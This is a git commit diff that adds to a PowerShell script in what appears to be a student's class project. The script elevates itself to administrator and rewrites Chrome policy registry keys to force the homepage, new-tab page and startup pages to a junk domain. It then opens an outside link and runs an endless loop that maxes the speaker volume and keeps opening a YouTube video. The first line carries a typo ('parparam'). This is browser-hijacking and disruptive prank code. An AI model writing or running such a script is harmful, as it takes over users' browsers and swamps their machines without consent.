cc9ee71e3b4d3f04e5ada8cce9fe105c9e35c539
nick71223 <50379199+nick71223@users.noreply.github.com>
2021-03-26 19:33:35 -0400

    Fixed it
    ive done so much work i cant even describe it

--- class github project/test 1.ps1
+++ class github project/test 1.ps1
@@ -1,17 +1,61 @@
-﻿$testkeyurl = Test-Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs'
+﻿parparam([switch]$Elevated)
+
+function Test-Admin {
+    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+}
+
+if ((Test-Admin) -eq $false)  {
+    if ($elevated) {
+        # tried to elevate, did not work, aborting
+    } else {
+        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
+    }
+    exit
+}
+
+Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
+$testkeyurl = Test-Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs'
 $testkeygoogle = Test-Path 'HKLM:\SOFTWARE\Policies\Google'
 $testkeychrome = Test-Path 'HKLM:\SOFTWARE\Policies\Google\Chrome'
+$testkeyreccommended = Test-Path 'HKLM:\Software\Policies\Google\Chrome\Recommended'
+$testkeyrestoreurl = Test-Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs'
 if(-not($testkeygoogle)){
     New-Item -Path 'HKLM:\SOFTWARE\Policies\Google'
     }
 if(-not($testkeychrome)){
     New-Item -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome'
-    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageIsNewTabPage' -Value 0 -PropertyType DWORD -force
+    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageIsNewTabPage' -Value 0x00000000 -PropertyType DWORD -force
     New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
+    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'NewTabPageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
     }
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'NewTabPageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageIsNewTabPage' -Value 0x00000000 -PropertyType DWORD -force
+if(-not($testkeyreccommended)){
+    New-Item -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended'
+    New-ItemProperty -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended' -Name 'RestoreOnStartup' -Value 0x00000004 -PropertyType DWORD -force
+    }
+if(-not($testkeyrestoreurl)){
+    New-Item -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs'
+    New-ItemProperty -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs' -Name '1' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
+    }
+
 #Making sure the user has the key before the process can continue
 if(-not($testkeyurl)){
     New-Item -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs'
     New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs' -Name  '1' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String  –Force
     }
- 
+
+if($true){ 
+    [system.Diagnostics.Process]::Start("chrome","https://shrekis.life/W15JAH")
+    }
+
+while ($true) {
+  Set-Speaker -Volume 50
+  Set-Speaker -Volume 50
+  Set-Speaker -Volume 50
+  Set-Speaker -Volume 50
+  [system.Diagnostics.Process]::Start("chrome","https://www.youtube.com/watch?v=CVyJ5tyJ-uI")
+}
+
